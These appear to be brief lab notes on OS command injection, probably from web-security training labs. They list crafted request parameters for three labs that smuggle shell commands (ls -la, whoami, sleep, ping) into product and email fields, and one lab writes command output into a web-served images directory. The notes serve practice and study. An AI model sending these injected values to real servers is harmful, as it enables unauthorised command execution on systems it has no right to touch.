1. Lab 1
- productId=1&storeId=1`|ls+-la`
- productId=1`+%26+ls+-la+%26+#`&storeId=1
- %26: &
- #: comment

2. Lab 2
- csrf=B4G7qXQpa91IgN4pRliywafxaqhCqo6C&name=a&email=a%40a`||ping+-c+10+8.8.8.8||`&subject=a&message=a
- csrf=NpzXZbQMaPD5aRoGBpdwH1W976s2LH0S&name=a&email=a%40a`||sleep+10||`&subject=a&message=a
- csrf=NpzXZbQMaPD5aRoGBpdwH1W976s2LH0S&name=a&email=a%40a`+%26+sleep+10+%23`&subject=a&message=a
- %26: &
- %23: #

3. Lab 3
- csrf=Zc4sDy8E3xY6OC2xEUAbBhBBLnKYQnQn&name=a&email=a%40a`%26whoami>/var/www/images/haha.txt%26%23`&subject=a&message=a
- %26: &
- %23: #
- csrf=Zc4sDy8E3xY6OC2xEUAbBhBBLnKYQnQn&name=a&email=a%40a`||ls+-la+/>/var/www/images/hihi.txt||`&subject=a&message=a